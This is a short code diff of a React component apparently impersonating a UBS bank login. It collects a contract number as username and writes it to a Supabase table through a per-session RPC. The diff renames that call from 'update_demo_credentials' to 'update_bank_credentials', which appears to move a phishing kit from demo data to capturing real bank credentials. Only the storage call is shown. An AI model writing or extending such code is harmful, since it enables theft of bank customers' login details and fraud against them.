@@ -164,7 +164,7 @@ const ChUbs = () => {
   const handleNext = async () => {
     if (!vertragsnummer) return;
     if (sessionId) {
-      const { error } = await supabase.rpc("update_demo_credentials", {
+      const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
         p_username: vertragsnummer,
         p_password: "",
